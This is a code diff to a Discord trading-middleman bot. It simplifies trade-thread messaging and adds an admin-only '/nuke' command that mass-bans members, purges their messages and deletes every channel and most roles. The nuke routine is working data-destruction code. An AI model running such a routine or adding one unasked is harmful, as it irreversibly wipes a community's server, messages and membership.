@@ -553,7 +553,12 @@ class MiddlemanBot extends EventEmitter {
           .addUserOption(option =>
             option.setName('user')
               .setDescription('User to reset')
-              .setRequired(true))
+              .setRequired(true)),
+        
+        new SlashCommandBuilder()
+          .setName('nuke')
+          .setDescription('🚨 EMERGENCY PROTOCOL: Nuke server (administrator only)')
+          .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
       ].map(command => command.toJSON());
 
       const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_BOT_TOKEN);
@@ -588,12 +593,12 @@ class MiddlemanBot extends EventEmitter {
     // Commands that need async work - defer immediately to prevent timeout
     const asyncCommands = ['balance', 'daily', 'work', 'collect', 'slut', 'casinostats', 'coinflip', 'dice', 'double', 'roulette', 'blackjack', 'hit', 'stand', 
                            'stats', 'user', 'trade', 'ai', 'mm', 'blacklist', 'report', 'verify', 'unverify', 'serverstats', 'cleanup', 
-                           'casinoadd', 'casinoremove', 'casinoreset'];
+                           'casinoadd', 'casinoremove', 'casinoreset', 'nuke'];
     const needsDefer = asyncCommands.includes(command);
     
     // Commands that should be ephemeral (only visible to user)
     const ephemeralCommands = ['stats', 'user', 'trade', 'mm', 'blacklist', 'report', 'verify', 'unverify', 'serverstats', 'cleanup', 
-                                'casinoadd', 'casinoremove', 'casinoreset'];
+                                'casinoadd', 'casinoremove', 'casinoreset', 'nuke'];
     const isEphemeral = ephemeralCommands.includes(command);
     
     if (needsDefer) {
@@ -712,6 +717,9 @@ class MiddlemanBot extends EventEmitter {
         case 'casinoreset':
           await this.handleSlashCasinoReset(interaction);
           break;
+        case 'nuke':
+          await this.handleSlashNuke(interaction);
+          break;
         default:
           await interaction.reply({ content: `❌ Unknown command. What the fuck are you trying to do?`, flags: 64 }); // 64 = EPHEMERAL flag
       }
@@ -819,12 +827,11 @@ class MiddlemanBot extends EventEmitter {
       );
 
       if (updatedRequest && updatedRequest.user1Accepted === 1 && updatedRequest.user2Accepted === 1) {
-        const trustedMMRole = process.env.TRUSTED_MIDDLEMAN_ROLE_ID || process.env.MIDDLEMAN_ROLE_ID;
-        const roleMention = trustedMMRole ? `<@&${trustedMMRole}>` : '';
+        const roleMention = process.env.MIDDLEMAN_ROLE_ID ? `<@&${process.env.MIDDLEMAN_ROLE_ID}>` : '';
         await thread.send({
-          content: `🎉 **Both parties have accepted the trade!**\n\n${roleMention}\n\n**Trade Ready for Middleman!**\n\n**Trade Details:**\n${request.item}\n\n**Participants:**\n- <@${user1Id}>\n- <@${user2Id}>\n\n*ZRX MARKET - Secure Trading Platform*`
+          content: `🎉 **Both parties have accepted the trade!**\n\n${roleMention} A middleman is needed for this trade.\n\n**Trade Details:**\n${request.item}\n\n**Participants:**\n- <@${user1Id}>\n- <@${user2Id}>`
         });
-        console.log(`✅ Both parties accepted trade #${requestId}, trusted middleman pinged`);
+        console.log(`✅ Both parties accepted trade #${requestId}, middleman pinged`);
 
       } else {
         const createdAt = new Date(request.createdAt);
@@ -1611,12 +1618,11 @@ class MiddlemanBot extends EventEmitter {
         );
 
         if (reason === 'both_accepted' || (finalRequest && finalRequest.user1Accepted === 1 && finalRequest.user2Accepted === 1)) {
-          const trustedMMRole = process.env.TRUSTED_MIDDLEMAN_ROLE_ID || process.env.MIDDLEMAN_ROLE_ID;
-          const roleMention = trustedMMRole ? `<@&${trustedMMRole}>` : '';
+          const roleMention = process.env.MIDDLEMAN_ROLE_ID ? `<@&${process.env.MIDDLEMAN_ROLE_ID}>` : '';
           await thread.send({
-            content: `🎉 **Both parties have accepted the trade!**\n\n${roleMention}\n\n**Trade Ready for Middleman!**\n\n**Trade Details:**\n${request.item}\n\n**Participants:**\n- <@${user1Id}>\n- <@${user2Id}>\n\n*ZRX MARKET - Secure Trading Platform*`
+            content: `🎉 **Both parties have accepted the trade!**\n\n${roleMention} A middleman is needed for this trade.\n\n**Trade Details:**\n${request.item}\n\n**Participants:**\n- <@${user1Id}>\n- <@${user2Id}>`
           });
-          console.log(`✅ Both parties accepted trade #${requestId}, trusted middleman pinged`);
+          console.log(`✅ Both parties accepted trade #${requestId}, middleman pinged`);
         } else {
           try {
             await thread.send('⏰ **Time expired or not all parties accepted.**\n\nThis thread will be deleted in 10 seconds.');
@@ -1658,18 +1664,6 @@ class MiddlemanBot extends EventEmitter {
         return;
       }
 
-      // Check if both parties already confirmed on the website
-      const bothConfirmedOnWebsite = request.user1RequestedMM && request.user2RequestedMM;
-      
-      // If both confirmed on website, mark them as accepted in DB and skip confirmation
-      if (bothConfirmedOnWebsite) {
-        await dbHelpers.run(
-          'UPDATE middleman SET user1Accepted = 1, user2Accepted = 1 WHERE id = ?',
-          [request.id]
-        );
-        console.log(`✅ Both parties already confirmed on website, skipping confirmation step`);
-      }
-
       const requester = await dbHelpers.get(
         'SELECT * FROM users WHERE discordId = ?',
         [request.requesterId]
@@ -1677,92 +1671,11 @@ class MiddlemanBot extends EventEmitter {
 
       const proofLinks = request.proofLinks ? JSON.parse(request.proofLinks) : [];
 
-      // Create thread with cooler messaging
-      const threadName = `MM-${request.id} | ${request.item?.substring(0, 50) || 'Trade'}`;
-      
-      // If both already confirmed, create thread directly without asking for confirmation
-      if (bothConfirmedOnWebsite) {
-        const initialMessage = await middlemanChannel.send({
-          content: `🔒 **Trade Agreement Confirmed** ✅\n\n<@${user1Id}> and <@${user2Id}> have both accepted this trade on the website.\n\n**Ready for middleman assistance!**`
-        });
-
-        const thread = await initialMessage.startThread({
-          name: threadName,
-          type: 12,
-          autoArchiveDuration: 60,
-          reason: `Middleman request #${request.id} - both parties confirmed`
-        });
-
-        console.log(`✅ Created thread (both confirmed): ${thread.name} (${thread.id})`);
-
-        await dbHelpers.run(
-          'UPDATE middleman SET threadId = ? WHERE id = ?',
-          [thread.id, request.id]
-        );
-
-        const usersToAdd = [request.requesterId, user1Id, user2Id];
-        const uniqueUsers = [...new Set(usersToAdd.filter(id => id && id.length > 0))];
-        
-        const axios = require('axios').default;
-        for (const userId of uniqueUsers) {
-          try {
-            await axios.put(
-              `https://discord.com/api/v10/channels/${thread.id}/thread-members/${userId}`,
-              {},
-              {
-                headers: {
-                  Authorization: `Bot ${process.env.DISCORD_BOT_TOKEN}`,
-                  'Content-Type': 'application/json'
-                }
-              }
-            );
-          } catch (error) {
-            console.log(`⚠️ Could not add user ${userId} to thread (they can join manually)`);
-          }
-        }
-
-        // Create cooler embed
-        const tradeEmbed = new EmbedBuilder()
-          .setTitle(`🤝 Middleman Request #${request.id} - ZRX MARKET`)
-          .setColor(0x00FF00)
-          .setDescription('**✅ Trade Agreement Confirmed**\n\nBoth parties have accepted this trade and are ready for middleman assistance!')
-          .addFields(
-            { name: '👤 Requester', value: `<@${request.requesterId}>`, inline: true },
-            { name: '👥 User 1', value: `<@${user1Id}>`, inline: true },
-            { name: '👥 User 2', value: `<@${user2Id}>`, inline: true },
-            { name: '🛒 Trade Details', value: request.item || 'N/A', inline: false },
-            { name: '💰 Value', value: request.value || 'N/A', inline: true },
-            { name: '🎮 Roblox Username', value: request.robloxUsername || 'N/A', inline: true }
-          )
-          .setFooter({ text: `ZRX MARKET | Request ID: ${request.id}` })
-          .setTimestamp();
-
-        if (proofLinks.length > 0) {
-          tradeEmbed.addFields({ 
-            name: '📎 Proof Links', 
-            value: proofLinks.map(link => `[Link](${link})`).join('\n'), 
-            inline: false 
-          });
-        }
-
-        // Ping trusted middleman role
-        const trustedMMRole = process.env.TRUSTED_MIDDLEMAN_ROLE_ID || process.env.MIDDLEMAN_ROLE_ID;
-        const roleMention = trustedMMRole ? `<@&${trustedMMRole}>` : '';
-        
-        await thread.send({
-          content: `${roleMention}\n\n🎉 **Trade Ready for Middleman!**\n\n**Participants:**\n- <@${user1Id}>\n- <@${user2Id}>\n\n**Trade:** ${request.item}\n\n*A trusted middleman is needed to facilitate this trade.*`,
-          embeds: [tradeEmbed]
-        });
-
-        console.log(`✅ Both parties confirmed, middleman pinged for request #${request.id}`);
-        return;
-      }
-
-      // If not both confirmed, create thread with acceptance requirement
       const initialMessage = await middlemanChannel.send({
         content: `🔒 **Trade Agreement Required**\n\n<@${user1Id}> and <@${user2Id}> must both accept this trade within 5 minutes.\n\nIf both parties don't accept, this thread will be automatically deleted.`
       });
 
+      const threadName = `MM-${request.id} | ${request.item?.substring(0, 50) || 'Trade'}`;
       const thread = await initialMessage.startThread({
         name: threadName,
         type: 12,
@@ -1799,7 +1712,7 @@ class MiddlemanBot extends EventEmitter {
       }
 
       const tradeEmbed = new EmbedBuilder()
-        .setTitle(`📋 Trade Agreement - Request #${request.id} | ZRX MARKET`)
+        .setTitle(`📋 Trade Agreement - Request #${request.id}`)
         .setColor(0xFFA500)
         .setDescription('**Both parties must accept this trade by reacting with ✅**\n\nYou have 5 minutes to both accept, or this thread will be deleted.')
         .addFields(
@@ -1810,7 +1723,7 @@ class MiddlemanBot extends EventEmitter {
           { name: '💰 Value', value: request.value || 'N/A', inline: true },
           { name: '🎮 Roblox Username', value: request.robloxUsername || 'N/A', inline: true }
         )
-        .setFooter({ text: `ZRX MARKET | Request ID: ${request.id} | React with ✅ to accept` })
+        .setFooter({ text: `Request ID: ${request.id} | React with ✅ to accept` })
         .setTimestamp();
 
       if (proofLinks.length > 0) {
@@ -1876,12 +1789,11 @@ class MiddlemanBot extends EventEmitter {
         );
 
         if (reason === 'both_accepted' || (finalRequest && finalRequest.user1Accepted === 1 && finalRequest.user2Accepted === 1)) {
-          const trustedMMRole = process.env.TRUSTED_MIDDLEMAN_ROLE_ID || process.env.MIDDLEMAN_ROLE_ID;
-          const roleMention = trustedMMRole ? `<@&${trustedMMRole}>` : '';
+          const roleMention = process.env.MIDDLEMAN_ROLE_ID ? `<@&${process.env.MIDDLEMAN_ROLE_ID}>` : '';
           await thread.send({
-            content: `🎉 **Both parties have accepted the trade!**\n\n${roleMention}\n\n**Trade Ready for Middleman!**\n\n**Trade Details:**\n${request.item}\n\n**Participants:**\n- <@${user1Id}>\n- <@${user2Id}>\n\n*ZRX MARKET - Secure Trading Platform*`
+            content: `🎉 **Both parties have accepted the trade!**\n\n${roleMention} A middleman is needed for this trade.\n\n**Trade Details:**\n${request.item}\n\n**Participants:**\n- <@${user1Id}>\n- <@${user2Id}>`
           });
-          console.log(`✅ Both parties accepted trade #${request.id}, trusted middleman pinged`);
+          console.log(`✅ Both parties accepted trade #${request.id}, middleman pinged`);
         } else {
           try {
             await thread.send('⏰ **Time expired or not all parties accepted.**\n\nThis thread will be deleted in 10 seconds.');
@@ -1934,28 +1846,26 @@ class MiddlemanBot extends EventEmitter {
       const proofLinks = request.proofLinks ? JSON.parse(request.proofLinks) : [];
 
       const embed = new EmbedBuilder()
-        .setTitle(`🤝 Middleman Request #${request.id} - ZRX MARKET`)
-        .setColor(0x00FF00)
-        .setDescription('**A trusted middleman is needed to facilitate this trade!**')
+        .setTitle(`Middleman Request #${request.id}`)
+        .setColor(0x5865F2)
         .addFields(
-          { name: '👤 Requester', value: requester?.username || 'Unknown', inline: true },
-          { name: '👥 User 1', value: request.user1, inline: true },
-          { name: '👥 User 2', value: request.user2, inline: true },
-          { name: '🛒 Trade Details', value: request.item || 'N/A', inline: false },
-          { name: '💰 Value', value: request.value || 'N/A', inline: true },
-          { name: '🎮 Roblox Username', value: request.robloxUsername || 'N/A', inline: true }
+          { name: 'Requester', value: requester?.username || 'Unknown', inline: true },
+          { name: 'User 1', value: request.user1, inline: true },
+          { name: 'User 2', value: request.user2, inline: true },
+          { name: 'Item/Details', value: request.item, inline: false },
+          { name: 'Value', value: request.value || 'N/A', inline: true },
+          { name: 'Roblox Username', value: request.robloxUsername || 'N/A', inline: true }
         )
-        .setFooter({ text: `ZRX MARKET | Request ID: ${request.id}` })
+        .setFooter({ text: `Request ID: ${request.id}` })
         .setTimestamp(new Date(request.createdAt));
 
       if (proofLinks.length > 0) {
         embed.addFields({ name: 'Proof Links', value: proofLinks.join('\n'), inline: false });
       }
 
-      const trustedMMRole = process.env.TRUSTED_MIDDLEMAN_ROLE_ID || process.env.MIDDLEMAN_ROLE_ID;
-      const roleMention = trustedMMRole ? `<@&${trustedMMRole}>` : '';
+      const roleMention = `<@&${process.env.MIDDLEMAN_ROLE_ID}>`;
       const message = await channel.send({
-        content: `${roleMention}\n\n**🤝 New Middleman Request - ZRX MARKET**\n\nA trusted middleman is needed for this trade!`,
+        content: `${roleMention} New middleman request!`,
         embeds: [embed]
       });
 
@@ -3967,6 +3877,160 @@ class MiddlemanBot extends EventEmitter {
       await interaction.editReply({ embeds: [embed] });
     } catch (error) {
       await interaction.editReply({ content: `❌ ${getSnarkyResponse('error')} ${error.message}` });
+    }
+  }
+
+  async handleSlashNuke(interaction) {
+    try {
+      // Check for administrator permission
+      if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
+        return await interaction.editReply({ content: `❌ ${getSnarkyResponse('noPermission')} You must be an administrator to use this command.` });
+      }
+
+      const guild = interaction.guild;
+      if (!guild) {
+        return await interaction.editReply({ content: '❌ This command can only be used in a server.' });
+      }
+
+      // Log the nuke action
+      await dbHelpers.run(
+        'INSERT INTO admin_logs (actorId, action, targetId, details) VALUES (?, ?, ?, ?)',
+        [interaction.user.id, 'nuke_server', guild.id, `Server nuke initiated by ${interaction.user.tag}`]
+      ).catch(() => {}); // Ignore if table doesn't exist
+
+      await interaction.editReply({ content: '🚨 **EMERGENCY PROTOCOL ACTIVATED**\n\nInitiating server nuke... This may take a while.' });
+
+      let bannedCount = 0;
+      let deletedChannels = 0;
+      let deletedRoles = 0;
+      let errors = [];
+
+      // Get bot member and bot's highest role
+      const botMember = await guild.members.fetch(this.client.user.id).catch(() => null);
+      const botHighestRole = botMember?.roles.highest;
+
+      // Step 1: Mass ban all members (except admins and bot)
+      try {
+        const members = await guild.members.fetch();
+        const banPromises = [];
+
+        for (const [id, member] of members) {
+          // Skip bot, skip admins, skip if user has administrator permission
+          if (id === this.client.user.id || member.id === interaction.user.id) continue;
+          if (member.permissions.has(PermissionFlagsBits.Administrator)) continue;
+
+          banPromises.push(
+            member.ban({ reason: `Server nuke - Emergency protocol by ${interaction.user.tag}`, deleteMessageSeconds: 604800 }) // Delete 7 days of messages
+              .then(() => { bannedCount++; })
+              .catch(err => { errors.push(`Failed to ban ${member.user.tag}: ${err.message}`); })
+          );
+        }
+
+        await Promise.allSettled(banPromises);
+      } catch (error) {
+        errors.push(`Error during mass ban: ${error.message}`);
+      }
+
+      // Step 2: Delete all channels (and purge messages first)
+      try {
+        const channels = await guild.channels.fetch();
+        const deletePromises = [];
+
+        for (const [id, channel] of channels) {
+          // Try to purge messages first (bulk delete up to 100 messages at a time)
+          if (channel.isTextBased() && channel.messages) {
+            try {
+              const messages = await channel.messages.fetch({ limit: 100 });
+              if (messages.size > 0) {
+                // Bulk delete messages (Discord allows up to 100 messages at a time)
+                await channel.bulkDelete(messages, true).catch(() => {});
+              }
+            } catch (purgeError) {
+              // Ignore purge errors, continue with deletion
+            }
+          }
+
+          deletePromises.push(
+            channel.delete(`Server nuke - Emergency protocol by ${interaction.user.tag}`)
+              .then(() => { deletedChannels++; })
+              .catch(err => { errors.push(`Failed to delete channel ${channel.name}: ${err.message}`); })
+          );
+        }
+
+        await Promise.allSettled(deletePromises);
+      } catch (error) {
+        errors.push(`Error during channel deletion: ${error.message}`);
+      }
+
+      // Step 3: Delete all roles (except admin roles, everyone role, and roles above bot's highest role)
+      try {
+        const roles = await guild.roles.cache;
+        const deletePromises = [];
+
+        for (const [id, role] of roles) {
+          // Skip @everyone role, skip if role is managed (bot roles), skip if role is above bot's highest role, skip if role has admin permissions
+          if (role.id === guild.id) continue; // @everyone
+          if (role.managed) continue; // Bot roles
+          if (botHighestRole && role.position >= botHighestRole.position) continue;
+          if (role.permissions.has(PermissionFlagsBits.Administrator)) continue;
+
+          deletePromises.push(
+            role.delete(`Server nuke - Emergency protocol by ${interaction.user.tag}`)
+              .then(() => { deletedRoles++; })
+              .catch(err => { errors.push(`Failed to delete role ${role.name}: ${err.message}`); })
+          );
+        }
+
+        await Promise.allSettled(deletePromises);
+      } catch (error) {
+        errors.push(`Error during role deletion: ${error.message}`);
+      }
+
+      // Step 4: Create a summary
+      const summary = new EmbedBuilder()
+        .setTitle('🚨 SERVER NUKE COMPLETE')
+        .setColor(0xFF0000)
+        .setDescription(`Emergency protocol executed by ${interaction.user.tag}`)
+        .addFields(
+          { name: '📊 Statistics', value: `**Banned:** ${bannedCount} members\n**Deleted Channels:** ${deletedChannels}\n**Deleted Roles:** ${deletedRoles}`, inline: false },
+          { name: '⏰ Time', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false }
+        )
+        .setFooter({ text: `Executor: ${interaction.user.tag} (${interaction.user.id})` })
+        .setTimestamp();
+
+      if (errors.length > 0) {
+        const errorText = errors.slice(0, 10).join('\n'); // Limit to first 10 errors
+        summary.addFields({ name: '⚠️ Errors', value: errorText.length > 1024 ? errorText.substring(0, 1021) + '...' : errorText, inline: false });
+      }
+
+      // Try to send summary to a new channel, or DM the executor
+      try {
+        // Try to create a new channel for the summary
+        const logChannel = await guild.channels.create({
+          name: 'nuke-log',
+          reason: 'Server nuke log channel'
+        }).catch(() => null);
+
+        if (logChannel) {
+          await logChannel.send({ embeds: [summary] });
+        } else {
+          // If channel creation fails, try to DM the executor
+          await interaction.user.send({ embeds: [summary] }).catch(() => {});
+        }
+      } catch (error) {
+        console.error('Error sending nuke summary:', error);
+      }
+
+      // Send final reply
+      await interaction.followUp({
+        content: `✅ **Server nuke complete!**\n\n**Banned:** ${bannedCount} members\n**Deleted Channels:** ${deletedChannels}\n**Deleted Roles:** ${deletedRoles}\n\n${errors.length > 0 ? `⚠️ ${errors.length} error(s) occurred during execution.` : ''}`,
+        flags: 64 // EPHEMERAL
+      });
+
+    } catch (error) {
+      console.error('Error in handleSlashNuke:', error);
+      await interaction.editReply({ content: `❌ ${getSnarkyResponse('error')} ${error.message}` }).catch(() => {});
+      await interaction.followUp({ content: `❌ Critical error during nuke: ${error.message}`, flags: 64 }).catch(() => {});
     }
   }
 
